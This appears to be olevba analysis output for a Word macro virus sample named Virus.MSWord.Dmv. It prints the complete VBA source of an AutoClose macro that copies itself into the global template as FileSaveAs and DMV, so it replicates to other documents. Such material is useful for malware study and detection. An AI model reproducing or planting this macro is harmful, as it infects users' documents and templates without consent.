olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv-ccdfaddde56a609f99a0831fc84c8e5b9decca568939e9a68d380443cd008b19
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv-ccdfaddde56a609f99a0831fc84c8e5b9decca568939e9a68d380443cd008b19 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Dmv-ccdfaddde56a609f99a0831fc84c8e5b9decca568939e9a68d380443cd008b19 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim binstalled
Dim bTooMuchTrouble
Dim sMe$
Dim sMacro$
'just to prove another point
On Error GoTo -1: On Error GoTo Abort
iMacroCount = WordBasic.CountMacros(0, 0)
'see we're already installed
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "DMV" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    'add FileSaveAs and copies of FileSaveAs and AutoClose
    'DMV is just for more fun
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":DMV"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:DMV"
    WordBasic.MsgBox "               DMV               ", 1
End If
Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+----------+--------------------+---------------------------------------------+

